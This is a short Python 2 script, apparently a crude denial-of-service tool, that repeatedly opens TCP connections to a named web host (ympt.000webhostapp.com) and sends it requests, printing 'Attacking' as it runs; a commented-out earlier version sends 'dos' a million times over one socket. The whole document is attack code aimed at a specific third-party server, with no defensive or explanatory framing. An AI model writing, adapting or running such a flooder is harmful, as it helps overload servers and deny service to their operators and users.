
import socket
import os
import sys
import time
"""
host = 'ympt.000webhostapp.com'
message = 'dos'

ip = socket.gethostbyname(host)
i = 0

def attack():
    sock.send(message)
    print sock.recv(20)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, 80))

for i in range(0,1000000):
    print i
    attack()



sock.close()"""
import socket, sys, os
IP = "ympt.000webhostapp.com"
message = "hi"
print "][ Attacking " + IP  + " ... ]["
print "injecting " + message;
def attack():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, 80))
    print ">> GET /" + message + " HTTP/1.1"
    s.send("GET /" + message + " HTTP/1.1\r\n")
    s.send("Host: " + IP  + "\r\n\r\n");
    s.close()
for i in range(1, 1000):
    attack()

